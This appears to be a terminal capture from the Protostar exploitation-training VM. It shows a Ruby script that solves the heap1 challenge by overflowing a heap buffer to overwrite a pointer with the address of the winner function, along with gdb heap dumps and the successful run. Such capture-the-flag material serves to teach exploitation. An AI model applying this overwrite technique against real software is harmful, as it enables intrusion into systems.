@@ -1,0 +1,26 @@
+user@protostar:/tmp/heap$ more heap1.rb 
+#!/usr/bin/ruby
+
+# 0x804a000  0x806b000    0x21000          0           [heap]
+
+# (gdb) r ABCD 1234
+# 0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+# 0x804a010:	0x00000000	0x00000011	0x44434241	0x00000000
+# 0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
+# 0x804a030:	0x00000000	0x00000011	0x34333231	0x00000000
+# 0x804a040:	0x00000000	0x00020fc1	0x00000000	0x00000000
+
+# 08048494 g     F .text	00000025              winner
+
+padding = "ABCD" * 5
+winner = "\x94\x84\x04\x08"
+
+command = <<-END
+/opt/protostar/bin/heap1 #{padding} #{winner}
+END
+
+puts `#{command}`
+user@protostar:/tmp/heap$ ./heap1.rb 
+and that's a wrap folks!
+user@protostar:/tmp/heap$ 
+
